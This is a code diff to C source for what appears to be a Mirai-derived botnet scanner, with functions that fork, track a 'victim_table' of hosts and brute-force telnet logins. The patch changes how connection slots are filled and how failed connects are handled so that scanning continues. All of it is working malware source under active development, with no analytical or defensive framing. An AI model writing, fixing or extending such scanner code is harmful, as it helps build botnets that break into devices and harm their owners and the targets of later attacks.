@@ -20,7 +20,7 @@ bool scan_scanning = false;
 
 void scan_init(void)
 {
-#	ifndef SCANNER_TEST
+#	ifndef SCANNER_FORCE
 	int32_t ret;
 
 	if ((ret = fork()) != 0)
@@ -82,12 +82,6 @@ uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int l
 
 	return ((uint16_t) (~sum));
 }
-
-#define TELNET_DO 0xFD // 253
-#define TELNET_WONT 0xFC // 252
-#define TELNET_WILL 0xFB // 251
-#define TELNET_DONT 0xFE // 254
-#define TELNET_CMD 0xFF // 255
 
 /*
 Credits to mirai for this one
@@ -228,7 +222,6 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 			break;
 			
 		}
-		#pragma message("Essentially when I comply with telnet it sends the password and user prompt at the same time")
 
 		if (found == 0)
 		{
@@ -279,8 +272,8 @@ bool scan_scanner(void)
 {
 #	ifdef DEBUG
 	int32_t max = getdtablesize();
-#	endif
 	printd("Maximum files open: %d", max);
+#	endif
 #	ifndef SCANNER_TEST
 	if (scan_able == false || scan_scanning == true)
 		_exit(0);
@@ -470,7 +463,8 @@ bool scan_scanner(void)
 
 			printd("Attempting to brute: %s", ipv4_unpack(riph->saddr));
 
-			for (uint8_t x = 0; x < SCAN_SCANNER_MAXCON; x++)
+			uint8_t x;
+			for (x = 0; x < SCAN_SCANNER_MAXCON; x++)
 			{
 				if (victim_table[x].state == END)
 				{
@@ -484,6 +478,8 @@ bool scan_scanner(void)
 					break; // Break from for loop
 				}
 			}
+			if (x == SCAN_SCANNER_MAXCON) // If we filled all available slots lets break
+				break;
 		}
 		// while (1)
 		{ // To make all this dealloc automaticly
@@ -528,13 +524,12 @@ bool scan_scanner(void)
 							if (connect(victim_table[i].sock, (struct sockaddr *)&addrx, sizeof(addrx)) == -1 && errno != EINPROGRESS)
 							{
 								printd("%d->%s Failed to connect error %d: %s", i, ipv4_unpack(victim_table[i].ip), errno, strerror(errno));
-								victim_table[i].state = FINISHED;
 							}
 							else
 							{
-								victim_table[i].state = SELECT;
 								printd("%d->%s Connected", i, ipv4_unpack(victim_table[i].ip));
 							}
+							victim_table[i].state = SELECT;
 							break;
 						}
 						case SELECT:
